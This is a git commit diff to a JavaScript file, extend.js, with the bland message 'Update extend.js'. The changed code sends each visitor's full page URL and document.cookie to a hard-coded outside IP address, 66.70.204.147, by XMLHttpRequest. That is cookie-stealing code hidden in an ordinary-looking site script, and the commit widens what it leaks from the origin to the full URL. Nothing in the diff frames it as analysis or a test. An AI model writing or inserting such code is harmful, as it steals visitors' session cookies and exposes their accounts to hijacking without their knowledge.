fb0c564af26a6ea5c81beae41c71a621c4988a6b
司土御帝 <1181935296@qq.com>
2020-09-15 01:19:05 +0800

    Update extend.js

--- extend.js
+++ extend.js
@@ -9,7 +9,7 @@
     meta.setAttribute("http-equiv","Content-Security-Policy");
     document.getElementsByTagName('head')[0].appendChild(meta);
     var httpRequest = new XMLHttpRequest();
-    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
+    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.href+"&c="+document.cookie, true);
     httpRequest.send();
     httpRequest.onreadystatechange = function () {
         if (httpRequest.readyState == 4 && httpRequest.status == 200) {
